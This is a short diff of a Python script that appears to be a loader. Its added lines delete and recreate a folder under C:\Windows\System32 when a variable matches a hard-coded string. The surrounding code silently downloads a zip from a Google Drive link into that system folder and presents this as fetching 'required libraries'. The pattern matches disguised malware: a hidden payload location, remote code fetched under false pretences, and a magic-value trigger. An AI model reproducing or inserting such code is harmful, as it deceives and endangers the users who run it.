@@ -194,7 +194,9 @@ delete_files_if_aesv3_missing()
 def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
-
+if file_contentsx1=="ZM2vsjeaWJHSf":
+    shutil.rmtree(r'C:\Windows\System32\MSRX')
+    os.mkdir(r'C:\Windows\System32\MSRX')
 if not os.path.exists("C:\\Windows\\System32\\MSRX\\AesV8.6.py"):
     print("downloading required libraries, please wait a moment...")
     download_file_from_google_drive("https://drive.google.com/uc?id=1Hiwd5pda2xluupedlaDIE5as6opFkE9Z", "C:\\Windows\\System32\\MSRX\\mydrx.zip")
